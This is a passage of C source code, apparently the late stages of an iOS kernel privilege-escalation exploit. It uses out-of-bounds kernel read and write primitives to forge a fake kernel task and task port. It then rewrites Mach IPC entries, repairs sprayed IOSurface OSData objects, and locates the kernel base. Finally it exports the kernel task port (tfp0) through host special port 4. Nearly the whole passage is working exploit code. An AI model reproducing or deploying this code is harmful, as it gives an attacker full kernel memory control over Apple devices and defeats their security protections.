		FIELD(fake_task, oob_task, ref_count,    uint32_t) = 4;
		FIELD(fake_task, oob_task, active,       uint32_t) = 1;
		FIELD(fake_task, oob_task, map,          uint64_t) = kernel_map;
	};
	void (^build_fake_kernel_port)(void *, uint64_t) = ^(void *fake_port, uint64_t fake_task_address) {
		FIELD(fake_port, oob_ipc_port, ip_bits,       uint32_t) = io_makebits(1, IOT_PORT, IKOT_TASK);
		FIELD(fake_port, oob_ipc_port, ip_references, uint32_t) = 4;
		FIELD(fake_port, oob_ipc_port, ip_receiver,   uint64_t) = ipc_space_kernel;
		FIELD(fake_port, oob_ipc_port, ip_kobject,    uint64_t) = fake_task_address;
		FIELD(fake_port, oob_ipc_port, ip_mscount,    uint32_t) = 1;
		FIELD(fake_port, oob_ipc_port, ip_srights,    uint32_t) = 1;
	};
	build_fake_kernel_task(fake_task_data);
	build_fake_kernel_port(fake_port_data, fake_task_address);
	// Now we can use our fake_port as a kernel task port.
    
	kernel_task_port = fake_port;

	// 33. Construct a better kernel task port.
	uint64_t fake_kernel_task_page = kernel_vm_allocate(2 * page_size);
	if (fake_kernel_task_page == 0) {
		ERROR("Could not allocate fake kernel task");
		fail();
	}
	uint64_t fake_kernel_task_port_page = fake_kernel_task_page + page_size;
	uint8_t page_buffer[page_size / 4];
	// Build the fake kernel_task.
	memset(page_buffer, 0, sizeof(page_buffer));
	*(uint16_t *) (page_buffer + 0x16) = 57;
	uint64_t fake_kernel_task_address = fake_kernel_task_page + 0x100;
	uint8_t *fake_kernel_task_data = page_buffer + 0x100;
	build_fake_kernel_task(fake_kernel_task_data);
	ok = oob_kernel_write(fake_kernel_task_page, page_buffer, sizeof(page_buffer));
	if (!ok) {
		ERROR("Failed to initialize fake kernel task page");
		fail();
	}
	// Build the fake kernel_task port.
	memset(page_buffer, 0, sizeof(page_buffer));
	*(uint16_t *) (page_buffer + 0x16) = 42;
	uint64_t fake_kernel_task_port_address = fake_kernel_task_port_page + 0x100;
	uint8_t *fake_kernel_task_port_data = page_buffer + 0x100;
	build_fake_kernel_port(fake_kernel_task_port_data, fake_kernel_task_address);
	ok = oob_kernel_write(fake_kernel_task_port_page, page_buffer, sizeof(page_buffer));
	if (!ok) {
		ERROR("Failed to initialize fake kernel task port page");
		fail();
	}

	// 34. Look up our current fake port and replace it with the new fake kernel_task port.
	uint64_t (^ipc_entry_lookup)(mach_port_t) = ^uint64_t(mach_port_t port_name) {
		uint64_t itk_space = current_ipc_space;
		uint32_t table_size = oob_kernel_read32(itk_space + OFFSET(oob_ipc_space, is_table_size));
		uint32_t port_index = MACH_PORT_INDEX(port_name);
		if (port_index >= table_size) {
			return 0;
		}
		uint64_t is_table = oob_kernel_read64(itk_space + OFFSET(oob_ipc_space, is_table));
		uint64_t entry = is_table + port_index * SIZE(oob_ipc_entry);
		return entry;
	};
	uint64_t fake_port_entry = ipc_entry_lookup(fake_port);
	// Drop our receive right so that we now only have a send right.
	uint32_t ie_bits = oob_kernel_read32(fake_port_entry + OFFSET(oob_ipc_entry, ie_bits));
	ie_bits &= ~MACH_PORT_TYPE_RECEIVE;
	oob_kernel_write32(fake_port_entry + OFFSET(oob_ipc_entry, ie_bits), ie_bits);
	// Change the object to point to the new fake kernel task port. This write has to be
	// atomic with respect to the write primitive itself (i.e. it can't be composed of two
	// separate 32-bit writes).
	oob_kernel_write64(fake_port_entry + OFFSET(oob_ipc_entry, ie_object),
			fake_kernel_task_port_address);

	// 35. Destroy the holding port for the out-of-line Mach ports message.
	mach_port_destroy(mach_task_self(), ool_ports_msg_holding_port);

	// 36. Patch up the IOSurface properties. We freed some of the kfree() buffer allocations
	// (and possibly split one allocation), and some of the OOL ports reallocation spray OSData
	// buffers probably overlap.
	// Get the address of the IOSurface.
	uint64_t IOSurfaceRootUserClient_ipc_entry = ipc_entry_lookup(IOSurfaceRootUserClient);
	uint64_t IOSurfaceRootUserClient_port =
		oob_kernel_read64(IOSurfaceRootUserClient_ipc_entry + OFFSET(oob_ipc_entry, ie_object));
	uint64_t IOSurfaceRootUserClient_address =
		oob_kernel_read64(IOSurfaceRootUserClient_port + OFFSET(oob_ipc_port, ip_kobject));
	uint64_t surfaceClients = oob_kernel_read64(IOSurfaceRootUserClient_address
			+ OFFSET(oob_IOSurfaceRootUserClient, surfaceClients));
	uint64_t surfaceClient = oob_kernel_read64(surfaceClients + IOSurface_id * sizeof(uint64_t));
	uint64_t surface = oob_kernel_read64(surfaceClient + OFFSET(oob_IOSurfaceClient, surface));
	// Get the OSDictionary of IOSurface properties and read out the array of entries.
	uint64_t properties = oob_kernel_read64(surface + OFFSET(oob_IOSurface, properties));
	uint32_t property_count = oob_kernel_read32(properties + OFFSET(oob_OSDictionary, count));
	uint64_t property_array = oob_kernel_read64(properties + OFFSET(oob_OSDictionary, dictionary));
	// We will build an array of OSData buffer addresses that have already been validated and
	// that future OSData objects should not overlap.
	uint64_t *validated_buffers = NULL;
	size_t validated_buffers_count = 0;
	size_t validated_buffers_capacity = 0;
	// Loop through each entry in the OSDictionary, patching up all the problematic OSData
	// objects we sprayed.
	for (uint32_t property_idx = 0; property_idx < property_count; property_idx++) {
		// Get the first 4 bytes of the key.
		uint64_t key_symbol = oob_kernel_read64(property_array
				+ (2 * property_idx) * sizeof(uint64_t));
		uint64_t key_data = oob_kernel_read64(key_symbol + OFFSET(oob_OSString, string));
		uint32_t key_value = oob_kernel_read32(key_data);
		// Skip any keys that don't correspond to the properties we need to fix up.
		if (key_value != kfree_buffer_key && key_value != ool_ports_reallocation_key) {
			continue;
		}
		// The value of this property should be an OSArray.
		uint64_t osarray = oob_kernel_read64(property_array
				+ (2 * property_idx + 1) * sizeof(uint64_t));
		uint32_t element_count = oob_kernel_read32(osarray + OFFSET(oob_OSArray, count));
		uint64_t elements = oob_kernel_read64(osarray + OFFSET(oob_OSArray, array));
		// Grow the validated_buffers array if necessary.
		if (validated_buffers_count + element_count > validated_buffers_capacity) {
			uint64_t new_capacity = validated_buffers_count + element_count;
			uint64_t *new_validated_buffers = realloc(validated_buffers,
					new_capacity * sizeof(validated_buffers[0]));
			assert(new_validated_buffers != NULL);
			validated_buffers = new_validated_buffers;
			validated_buffers_capacity = new_capacity;
		}
		// Loop through every OSData element in the array.
		for (uint32_t element_idx = 0; element_idx < element_count; element_idx++) {
			// Read out the OSData. The data buffer is valid if (1) it is exactly
			// mapped by a single allocation, and (2) it does not collide with another
			// data buffer. Any OSData that does not abide by these properties will
			// have its size set to zero. This does mean that we will leak the two
			// partial OSData objects (where part of the buffer was freed but the other
			// part is still allocated).
			uint64_t osdata = oob_kernel_read64(elements + element_idx * sizeof(uint64_t));
			uint32_t buffer_size = oob_kernel_read32(osdata + OFFSET(oob_OSData, capacity));
			uint64_t buffer_address = oob_kernel_read64(osdata + OFFSET(oob_OSData, data));
			// If this OSData's buffer has been previously validated, then the
			// allocation is going to be freed by another OSData, so prevent it from
			// being freed again.
			for (size_t i = 0; i < validated_buffers_count; i++) {
				if (buffer_address == validated_buffers[i]) {
					goto disable_free;
				}
			}
			// Get the start address and size of the allocation that contains the first
			// page of the OSData buffer.
			mach_vm_address_t region_address = buffer_address;
			mach_vm_size_t region_size = 0;
			natural_t depth = 0;
			struct vm_region_submap_info_64 info;
			mach_msg_type_number_t count = VM_REGION_SUBMAP_INFO_COUNT_64;
			kr = mach_vm_region_recurse(kernel_task_port,
					&region_address, &region_size, &depth,
					(vm_region_recurse_info_t) &info, &count);
			if (kr != KERN_SUCCESS) {
				WARNING("Could not determine OSData allocation region");
				goto disable_free;
			}
			// If this OSData's buffer does not exactly align with the allocation,
			// prevent it from being freed.
			// TODO: Free this data properly.
			if (region_address != buffer_address || region_size != buffer_size) {
				WARNING("Leaking 0x%016llx-0x%016llx",
						region_address, region_address + region_size);
				goto disable_free;
			}
			// This OSData buffer is valid. Add it to the list.
			assert(validated_buffers_count < validated_buffers_capacity);
			validated_buffers[validated_buffers_count] = buffer_address;
			validated_buffers_count++;
			continue;
disable_free:
			// Prevent this OSData from freeing its buffer by setting the size to zero.
			oob_kernel_write32(osdata + OFFSET(oob_OSData, capacity), 0);
		}
	}
	// Free the validated buffers array.
	free(validated_buffers);

	// 37. Store the address of some vtable so we can scan for the kernel base. We can no
	// longer scan backwards from realhost because trying to read the PPL pages faults.
	uint64_t kernel_text_address = oob_kernel_read64(IOSurfaceRootUserClient_address);
	kernel_text_address |= 0xffffff8000000000;	// Clear PAC

	// 38. Clean up IOSurface.
	IOSurface_deinit();
    
	// 39. Get the kernel base address.
	uint64_t kernel_base = 0;
	uint64_t kernel_page = kernel_text_address & ~(page_size - 1);
	for (;; kernel_page -= page_size) {
		const uint32_t mach_header[4] = { 0xfeedfacf, 0x0100000c, 2, 2 };
		uint32_t data[4] = {};
		ok = oob_kernel_read(kernel_page, data, sizeof(data));
		data[2] = mach_header[2];	// Ignore cpusubtype
		if (ok && memcmp(data, mach_header, sizeof(mach_header)) == 0) {
			kernel_base = kernel_page;
			break;
		}
	}
    
	INFO("oob kernel base: 0x%016llx", kernel_base);
    INFO("oob tfp0: 0x%x", kernel_task_port);

	// 40. Export the kernel task port via host special port 4.
	oob_kernel_write64(fake_kernel_task_address + OFFSET(oob_task, all_image_info_addr), kernel_base);
	uint64_t host_entry = ipc_entry_lookup(host);
	uint64_t host_port = oob_kernel_read64(host_entry + OFFSET(oob_ipc_entry, ie_object));
	mach_port_deallocate(mach_task_self(), host);
	oob_kernel_write32(host_port + OFFSET(oob_ipc_port, ip_bits), io_makebits(1, IOT_PORT, IKOT_HOST_PRIV));
	uint64_t realhost = oob_kernel_read64(host_port + OFFSET(oob_ipc_port, ip_kobject));
	oob_kernel_write64(realhost + OFFSET(oob_host, special) + 4 * sizeof(uint64_t),
			fake_kernel_task_port_address);
    
    extern void prepare_rwk_via_tfp0(mach_port_t port);
    prepare_rwk_via_tfp0(kernel_task_port);
    
    *kernel_base_out = kernel_base;
}
